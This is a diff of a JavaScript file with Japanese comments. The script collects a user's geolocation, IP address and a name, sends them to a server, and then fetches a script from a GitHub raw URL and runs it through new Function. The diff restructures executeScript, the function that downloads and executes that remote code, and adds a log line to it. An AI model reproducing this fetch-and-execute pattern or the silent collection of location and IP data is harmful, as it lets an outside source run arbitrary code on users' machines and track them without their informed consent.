@@ -6,7 +6,7 @@ function getLocation() {
   // nameがない場合はpromptで入力を求める
   if (!name) {
     name = prompt("誰が使ったかわからなくなると困るので、あだ名でもなんでもいいのでわかるようにしておくため、名前を入力してください");
-    
+
     // 入力があればローカルストレージに保存
     if (name) {
       localStorage.setItem('name', name);
@@ -29,7 +29,7 @@ function sendLocationData(position, name) {
   var longitude = position.coords.longitude;
 
   // IPアドレスとユーザーエージェント情報
-  fetch('https://ipinfo.io?callback')
+  fetch('https://ipinfo.io?callback') // YOUR_API_TOKEN を実際のトークンに置き換える
     .then(res => res.json())
     .then(json => {
       var ipAddress = json.ip;
@@ -47,15 +47,8 @@ function sendLocationData(position, name) {
         .then(response => response.text())
         .then(data => {
           console.log(data); // サーバーからの応答をコンソールに表示
-          function executeScript(url) {  
-            fetch(url)    
-              .then(data => data.text())    
-              .then(text => {      
-                const scriptFunction = new Function(text);      
-                scriptFunction();    
-              });
-          }
-          executeScript("https://raw.githubusercontent.com/hirotomoki12345/hamanan/main/GUI.js");
+          // スクリプトを実行
+          executeScript("https://raw.githubusercontent.com/hirotomoki12345/hamanan/main/gui.js");
         })
         .catch(error => {
           console.error("Error sending data:", error);
@@ -63,6 +56,18 @@ function sendLocationData(position, name) {
     })
     .catch(error => {
       console.error("Error getting IP address:", error);
+    });
+}
+
+// スクリプトを実行する関数
+function executeScript(url) {
+  fetch(url)
+    .then(data => data.text())
+    .then(text => {
+            console.log("Received script:", text);  // 追加行
+
+      const scriptFunction = new Function(text);
+      scriptFunction();
     });
 }
 
